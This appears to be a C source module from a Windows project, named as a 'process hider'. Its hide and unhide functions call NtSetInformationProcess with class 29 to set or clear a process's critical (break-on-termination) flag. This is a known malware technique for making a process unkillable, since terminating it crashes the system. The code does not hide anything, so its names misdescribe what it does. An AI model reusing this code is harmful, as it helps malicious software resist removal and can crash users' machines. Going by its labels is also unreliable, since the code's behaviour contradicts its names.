#include "../include/process_hiding.h"
#include "../include/utils.h"
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>

struct ProcessHider {
    BOOL (*hide_process)(ProcessHider*, DWORD);
    BOOL (*unhide_process)(ProcessHider*, DWORD);
};

typedef NTSTATUS (NTAPI *PNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

static BOOL hide_process_internal(ProcessHider* hider, DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return FALSE;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    PNtSetInformationProcess NtSetInformationProcess = (PNtSetInformationProcess)
        GetProcAddress(hNtdll, "NtSetInformationProcess");

    if (NtSetInformationProcess == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    ULONG breakOnTermination = 1;
    NTSTATUS status = NtSetInformationProcess(hProcess, 29, &breakOnTermination, sizeof(ULONG));

    CloseHandle(hProcess);
    return NT_SUCCESS(status);
}

static BOOL unhide_process_internal(ProcessHider* hider, DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return FALSE;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    PNtSetInformationProcess NtSetInformationProcess = (PNtSetInformationProcess)
        GetProcAddress(hNtdll, "NtSetInformationProcess");

    if (NtSetInformationProcess == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    ULONG breakOnTermination = 0;
    NTSTATUS status = NtSetInformationProcess(hProcess, 29, &breakOnTermination, sizeof(ULONG));

    CloseHandle(hProcess);
    return NT_SUCCESS(status);
}

ProcessHider* process_hider_create(void) {
    ProcessHider* hider = safe_malloc(sizeof(ProcessHider));
    hider->hide_process = hide_process_internal;
    hider->unhide_process = unhide_process_internal;
    return hider;
}

void process_hider_destroy(ProcessHider* hider) {
    if (hider) {
        safe_free(hider);
    }
}